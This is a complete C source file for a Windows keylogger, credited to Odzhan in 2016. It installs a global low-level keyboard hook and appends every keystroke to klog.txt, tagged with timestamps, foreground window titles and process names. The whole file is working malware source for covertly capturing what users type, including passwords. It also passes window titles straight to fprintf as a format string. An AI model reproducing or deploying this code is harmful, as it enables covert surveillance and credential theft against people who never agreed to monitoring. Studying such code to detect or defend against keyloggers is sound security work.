/**
  Copyright (C) 2016 Odzhan.
  
  All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>

#if !defined (__GNUC__)
#pragma comment (lib, "advapi32.lib")
#endif

HHOOK hHook;
FILE  *fd;
HWND  hWindow;
DWORD pid;

// allocate memory
void *xmalloc (SIZE_T dwSize) {
  return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

// free memory
void xfree (void *mem) {
  HeapFree (GetProcessHeap(), 0, mem);
}

DWORD pid2name (char pname[]) 
{
  PROCESSENTRY32 pe32;
  HANDLE         snap;
  BOOL           rs;
  DWORD          err=-1;
  
  snap = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
  
  if (snap != INVALID_HANDLE_VALUE) {
    pe32.dwSize = sizeof (pe32);
    
    rs = Process32First (snap, &pe32);

    while (rs) {
      if (pe32.th32ProcessID==pid) {
        lstrcpy (pname, pe32.szExeFile);
        err=ERROR_SUCCESS;
        break;
      }
      rs = Process32Next (snap, &pe32);
    }
    CloseHandle (snap);
  }
  return err;
}

// get domain and user id for process
BOOL proc2uid (HANDLE hProc, char domain[], 
  PDWORD domlen, char username[], PDWORD ulen) 
{
  HANDLE       hToken;
  SID_NAME_USE peUse;
  PTOKEN_USER  pUser;
  BOOL         bResult = FALSE;
  DWORD        dwTokenSize = 0, 
               dwUserName = 64, 
               dwDomain = 64;
  
  // try open security token
  if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
    return FALSE;
  }
  
  // try obtain user information size
  if (!GetTokenInformation (hToken, TokenUser, 
    0, 0, &dwTokenSize)) 
  {
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) 
    {
      pUser = xmalloc(dwTokenSize);
      if (pUser != NULL) 
      {
        if (GetTokenInformation (hToken, TokenUser, 
          pUser, dwTokenSize, &dwTokenSize)) 
        {
          bResult = LookupAccountSid (NULL, pUser->User.Sid, 
            username, ulen, domain, domlen, &peUse);
        }
        xfree (pUser);
      }
    }
  }
  CloseHandle (hToken);
  return bResult;
}

// obtain and log information about module
void log_exe(void)
{
  DWORD id;
  char pname[256];
  
  // get the process id
  GetWindowThreadProcessId (hWindow, &id);
  // if it's not same as current, get name
  if (id!=pid)
  {
    pid=id;
    if (pid2name(pname)==ERROR_SUCCESS) {
      fprintf (fd, "\nprocess : %s\n", pname);
      fflush (fd);
    }
  }
}

// return TRUE or FALSE if foreground window has changed
void log_wnd(void)
{
  char txt[256];
  hWindow=GetForegroundWindow();
  
  GetWindowText (hWindow, txt, sizeof (txt));
  fprintf (fd, txt);
  fflush (fd);
}

// obtain and log current time/date
void log_time (void)
{
  SYSTEMTIME st;
  char       date[64], time[64];
  
  GetLocalTime (&st);
  
  GetDateFormat (LOCALE_SYSTEM_DEFAULT, 0, 
    &st, "dd MMM yyyy", date, sizeof(date));
    
  GetTimeFormat (LOCALE_SYSTEM_DEFAULT, 0, 
    &st, "HH:mm:ss tt", time, sizeof(time));
  
  fprintf (fd, "\n%s, %s\n", date, time);
  fflush (fd);
}

// log time, module and window info
void log_info (void)
{
  log_time();
  log_wnd();
  log_exe();
}

LRESULT CALLBACK LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
{
  KBDLLHOOKSTRUCT *hs=(KBDLLHOOKSTRUCT*)lParam;
  BYTE            ks[256]={0}, txt[256]={0}, key[64]={0};
  DWORD           r=0;
  
  for (;;)
  {
    // ignore key releases
    if (wParam==WM_SYSKEYUP || wParam==WM_KEYUP || wParam==WM_SYSKEYUP) break;
    
    // ignore left or right shift and capslock
    if (hs->vkCode==VK_LSHIFT ||
        hs->vkCode==VK_RSHIFT ||
        hs->vkCode==VK_CAPITAL) break;
        
    // check if window changed
    if (GetForegroundWindow()!=hWindow) {
      log_wnd();
    }
    
    // convert escape, backspace or tab to text instead
    if (hs->vkCode!=VK_ESCAPE &&
        hs->vkCode!=VK_BACK   &&
        hs->vkCode!=VK_TAB)
    {
      GetKeyboardState (ks);
    
      ks[VK_SHIFT]   = GetKeyState(VK_LSHIFT) | GetKeyState(VK_RSHIFT);
      ks[VK_CAPITAL] = GetKeyState(VK_CAPITAL);
      ks[VK_CONTROL] = 0;
    
      r=ToAscii (hs->vkCode, hs->scanCode, ks, (LPWORD)key, 0);
    }
    if (r==0) {
      GetKeyNameText(hs->scanCode<<16 | hs->flags<<24, txt, sizeof(txt));
      // enclose in brackets
      wsprintf (key, "[%s]", txt);
    }
    // replace carriage return with new line
    if (key[0]=='\r') key[0]='\n';
    fprintf (fd, "%s", key);
    fflush (fd);
    break;
  }
  return CallNextHookEx (hHook, nCode, wParam, lParam);
}

int main (void)
{
  MSG msg;
  HMODULE hInstance=GetModuleHandle(NULL);
  
  // create / append to log in current directory
  fd=fopen ("klog.txt", "a");
  if (fd!=NULL)
  {
    // log the date, system name, user name
    log_info();
    // install hook
    hHook=SetWindowsHookEx (WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    // loop
    GetMessage (&msg, NULL, 0, 0);
    // log the time
    log_time();
    // close log
    fclose (fd);
    // remove hook
    UnhookWindowsHookEx (hHook); 
  }
  return 0;
}
